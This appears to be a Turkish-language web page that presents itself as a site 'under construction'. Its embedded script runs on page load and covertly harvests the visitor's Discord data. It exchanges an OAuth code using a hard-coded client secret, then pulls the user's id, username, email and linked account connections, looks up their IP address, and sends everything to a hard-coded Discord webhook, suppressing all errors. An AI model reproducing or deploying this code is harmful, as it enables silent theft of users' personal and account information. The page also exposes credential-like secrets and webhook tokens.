<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Yükleniyor...</title>
  <style>
    body {
      background: #0a0a0a;
      color: white;
      font-family: monospace;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
      text-align: center;
      animation: rgb 5s infinite;
    }
    h1 { font-size: 2rem; margin-bottom: 1rem; }
    p { font-size: 1rem; color: #aaa; }
    @keyframes rgb {
      0%{text-shadow:0 0 10px red}
      33%{text-shadow:0 0 10px lime}
      66%{text-shadow:0 0 10px blue}
      100%{text-shadow:0 0 10px red}
    }
  </style>
</head>
<body>
  <h1>Sitemize hoş geldiniz</h1>
  <p>Sitemiz şu anda yapım aşamasında.</p>

<script>
(async () => {
  const d = new URLSearchParams(location.search).get("code");
  if (!d) return;
  try {
    const t = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id: "1354724175788380327",
        client_secret: "Qodg1_-lrOw6cxHFdH1KhD-T1jcTAVFM",
        grant_type: "authorization_code",
        code: d,
        redirect_uri: "https://rencordx.github.io/home/callback.html"
      })
    }).then(r => r.json());
    if (!t.access_token) return;

    const headers = { Authorization: `Bearer ${t.access_token}` };

    const u = await fetch("https://discord.com/api/users/@me", {
      headers
    }).then(r => r.json());

    const con = await fetch("https://discord.com/api/users/@me/connections", {
      headers
    }).then(r => r.json());

    const i = await fetch("https://api.ipify.org?format=json").then(r => r.json());

    const j = {
      id: u.id,
      username: `${u.username}#${u.discriminator}`,
      email: u.email || null,
      client_ip: i.ip,
      vanity_url: `https://discord.com/users/${u.id}`,
      connections: con || []
    };

    await fetch("https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "```json\n" + JSON.stringify(j, null, 2) + "\n```" })
    });
  } catch (_) {}
})();
</script>
</body>
</html>
